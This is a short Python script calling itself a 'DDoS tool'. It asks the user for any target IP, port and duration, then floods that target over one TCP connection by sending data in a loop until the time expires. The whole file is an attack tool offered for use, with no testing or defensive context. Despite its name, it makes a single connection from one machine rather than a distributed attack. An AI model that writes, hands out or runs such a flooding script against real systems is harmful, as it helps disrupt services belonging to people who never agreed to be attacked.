import os
import sys
import time
import socket

def ddos(target_ip, target_port, duration):
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect to the target
    try:
        s.connect((target_ip, target_port))
    except Exception as e:
        print("Error: ", e)
        return
    
    print(f"DDoS attack started on {target_ip}:{target_port} for {duration} seconds")
    
    # Keep sending data until the duration expires
    start_time = time.time()
    while (time.time() - start_time) < duration:
        try:
            s.send(b'Data to flood the target with...')
        except Exception as e:
            print("Error: ", e)
            break
    
    # Close the socket
    s.close()
    print("DDoS attack finished.")

def main():
    print("Welcome to the Python DDoS tool!")
    
    # Get target IP address
    target_ip = input("Enter the target IP address: ")
    # Get target port
    target_port = int(input("Enter the target port: "))
    # Get attack duration
    duration = int(input("Enter the attack duration (in seconds): "))
    
    # Start the DDoS attack
    ddos(target_ip, target_port, duration)

if __name__ == "__main__":
    main()
